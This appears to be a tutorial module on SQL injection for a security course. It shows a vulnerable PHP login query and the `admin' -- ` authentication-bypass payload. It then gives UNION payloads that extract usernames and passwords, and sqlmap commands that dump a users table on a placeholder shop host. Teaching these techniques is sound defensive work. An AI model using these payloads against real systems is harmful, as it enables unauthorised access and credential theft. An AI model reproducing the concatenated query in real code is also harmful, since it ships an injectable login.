# Module 08 Examples: SQL Injection (SQLi)

## 1. The Classic Authentication Bypass
Imagine a vulnerable login script:
```php
$user = $_POST['username'];
$pass = $_POST['password'];
$sql = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";
```

**The Payload:**
- **Username field:** `admin' -- `
- **Password field:** (Leave blank or anything)

**The Resulting Query:**
```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = ''
```
The `-- ` comments out the password check, logging you in as `admin`.

## 2. UNION-Based SQL Injection
Extracting data from other tables by combining queries.

**The Scenario:** A product page `http://shop.local/item.php?id=1` is vulnerable.
**Payload to find column count:**
```text
http://shop.local/item.php?id=1 ORDER BY 3 -- 
http://shop.local/item.php?id=1 ORDER BY 4 -- (Error! There are 3 columns)
```
**Payload to extract data:**
```text
http://shop.local/item.php?id=-1 UNION SELECT 1, username, password FROM users -- 
```

## 3. Automating with SQLMap
Instead of doing it manually, you can use `sqlmap`:
```bash
# Basic detection and database extraction
sqlmap -u "http://shop.local/item.php?id=1" --dbs

# Dump the 'users' table from the 'shop_db' database
sqlmap -u "http://shop.local/item.php?id=1" -D shop_db -T users --dump
```
